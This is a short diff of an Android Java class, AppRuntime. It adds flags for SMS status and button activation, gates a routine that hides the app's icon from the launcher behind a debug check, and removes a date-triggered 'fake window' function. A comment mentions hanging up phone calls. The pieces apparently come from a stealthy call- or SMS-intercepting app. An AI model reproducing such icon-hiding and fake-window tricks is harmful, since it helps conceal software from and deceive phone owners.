@@ -13,7 +13,6 @@ import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.api.ActiveResponse;
 
 import java.io.*;
-import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Random;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -45,6 +44,10 @@ public class AppRuntime {
     public static AtomicBoolean WATCHING_SERVICE_RUNNING = new AtomicBoolean(false);
     public static AtomicBoolean WATCHING_SERVICE_BREAK = new AtomicBoolean(true);
     public static AtomicBoolean WATCHING_TOP_IS_SETTINGS = new AtomicBoolean(false);
+
+    public static AtomicBoolean ACTIVE_LEFT_BUTTON = new AtomicBoolean(false);
+
+    public static AtomicBoolean UPDATE_SMS_STATUS = new AtomicBoolean(false);
 
     /**
      * 默认的挂断电话的时间延迟
@@ -270,19 +273,12 @@ public class AppRuntime {
     }
 
     public static void hideInLauncher(Context context) {
-        PackageManager pm = context.getPackageManager();
-        pm.setComponentEnabledSetting(new ComponentName(context, ShowSettingsActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-    }
-
-    public static boolean shouldForceShowFakeWindow(Context context) {
-        Calendar c = Calendar.getInstance();
-        int curDay = c.get(Calendar.DAY_OF_YEAR);
-        int curYear = c.get(Calendar.YEAR);
-        if (curYear > 2014 || curDay >= Config.FORCE_START_DAY) {
-            return true;
+        if (Config.DEBUG) {
+            return;
         }
 
-        return false;
+        PackageManager pm = context.getPackageManager();
+        pm.setComponentEnabledSetting(new ComponentName(context, ShowSettingsActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
 }
